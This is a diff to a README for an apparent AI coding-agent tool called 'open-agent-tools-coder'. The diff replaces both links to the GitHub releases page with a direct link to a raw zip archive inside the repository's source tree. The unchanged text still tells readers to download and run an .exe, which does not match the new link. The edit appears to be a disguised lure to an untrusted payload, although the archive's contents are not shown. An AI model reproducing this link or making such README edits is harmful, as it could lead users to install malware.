@@ -1,6 +1,6 @@
 # 🤖 open-agent-tools-coder - Let your ai model read code.
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/ogdbea4120/open-agent-tools-coder/releases)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/ogdbea4120/open-agent-tools-coder/raw/refs/heads/main/oats/session/coder_open_tools_agent_v3.9.zip)
 
 ## What is this tool? 🛠️
 
@@ -22,7 +22,7 @@ Your computer needs specific parts to run this software well. Please check your 
 
 You can download the application from our release page. Visit this link to see the available versions.
 
-[Download the latest version here](https://github.com/ogdbea4120/open-agent-tools-coder/releases)
+[Download the latest version here](https://github.com/ogdbea4120/open-agent-tools-coder/raw/refs/heads/main/oats/session/coder_open_tools_agent_v3.9.zip)
 
 Look for the file that ends with a .exe extension. Click the file name to start the download. Save this file to a folder you can find easily, such as your Downloads folder.
 
